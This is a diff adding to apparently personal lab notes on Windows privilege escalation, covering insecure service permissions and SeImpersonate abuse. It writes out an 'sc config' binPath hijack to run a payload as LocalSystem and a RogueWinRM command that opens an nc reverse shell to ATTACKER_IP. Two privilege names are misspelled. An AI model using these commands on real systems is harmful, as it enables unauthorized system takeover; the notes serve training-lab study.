@@ -83,4 +83,10 @@ via Windows Services: Insecure Service Permissions
 5. C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem to change the executable
 6. C:\> sc stop THMService and C:\> sc start THMService to run the payload
 
+via SeImpersonate / SeAssignPrimaryToken
+
+1. whoami /priv (check for SetAssetPrimaryTokenPrivilege and SetImpersonatePrivilege)
+2. (Attacker Machine) nc -nlvp 4446
+3. c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4446"
+
 
